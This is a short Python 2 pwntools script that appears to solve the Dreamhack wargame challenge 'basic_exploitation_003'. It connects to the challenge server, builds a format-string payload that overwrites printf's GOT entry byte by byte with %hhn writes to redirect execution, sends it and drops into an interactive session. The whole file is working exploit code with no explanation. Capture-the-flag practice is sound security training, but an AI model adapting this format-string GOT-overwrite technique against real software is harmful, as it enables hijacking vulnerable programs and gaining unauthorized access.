#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"

HOST = "host1.dreamhack.games"
PORT = 18523

e = ELF("./basic_exploitation_003")
conn = remote(HOST, PORT)

payload = p32(e.got["printf"])
payload += p32(e.got["printf"]+1)
payload += "%"+str(0x69-0x08)+"c"
payload += "%1$hhn"
payload += "%"+str(0x86-0x69)+"c"
payload += "%2$hhn"

print(payload)
conn.sendline(payload)
conn.interactive()
